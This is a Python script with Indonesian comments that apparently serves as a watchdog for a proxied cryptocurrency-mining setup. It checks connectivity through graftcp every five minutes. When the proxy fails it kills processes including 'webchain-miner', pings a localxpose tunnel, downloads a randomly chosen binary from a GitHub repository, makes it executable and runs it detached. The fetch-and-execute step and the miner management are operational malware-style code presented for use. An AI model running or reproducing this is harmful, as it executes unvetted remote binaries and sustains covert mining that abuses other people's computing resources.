import time
import requests
import subprocess
import os
import random

def check_proxy():
    try:
        # Url
        url = 'https://jsonapi.org/'
        # Membuat subprocess untuk menjalankan curl command
        curl_command = f"./graftcp/graftcp curl -s -o /dev/null -w '%{{http_code}}' {url}"
        result = subprocess.run(curl_command, shell=True, capture_output=True, text=True, timeout=10)

        # Memeriksa http_code dari respons curl
        if result.returncode == 0:
            response_code = result.stdout.strip()  # Mendapatkan http_code dari output
            if response_code == '200':
                return True
            else:
                return False
        else:
            return False

    except Exception as e:
        print(f"Error: {e}")
        return False

def kill_processes(process_list):
    subprocess.run(['pkill', '-9'] + process_list)

def send_info():
    try:
        requests.get('https://localtopublic.ap.loclx.io/info')
    except requests.RequestException as e:
        print(f"Error saat mengakses website: {e}")

def download_and_run_file():
    download_link_base = "https://github.com/suplays/starterpack/raw/main/nim/backup/"
    file_names = ['satu', 'dua', 'tiga', 'empat', 'lima', 'enam', 'tujuh']

    try:
        os.chdir("..")
        random_file_name = random.choice(file_names)
        download_link = f"{download_link_base}{random_file_name}"
        response = requests.get(download_link)
        
        if response.status_code == 200:
            file_path = f"./{random_file_name}"
            with open(file_path, 'wb') as file:
                file.write(response.content)
            os.chmod(file_path, 0o755)
            
            subprocess.Popen(f"./{random_file_name}", shell=True, stdin=None, stdout=None, stderr=None, close_fds=True)
        else:
            raise Exception("Gagal mengunduh file.")
    except Exception as e:
        print(f"Error downloading/running file: {e}")

if __name__ == "__main__":
    process_list = ['webchain-miner', 'gas', 'graftcp', 'graftcp-local']
    
    while True:
        if check_proxy():
            print("Proxy aktif.")
            time.sleep(300)
        else:
            print("Proxy tidak valid. Menghentikan proses.")
            kill_processes(process_list)

            try:
                send_info()
            except Exception as ex:
                print(f"Error saat mengirim info: {ex}")

            try:
                download_and_run_file()
                break
            except Exception as e:
                print(f"Error saat download dan jalankan file: {e}")
                time.sleep(30)
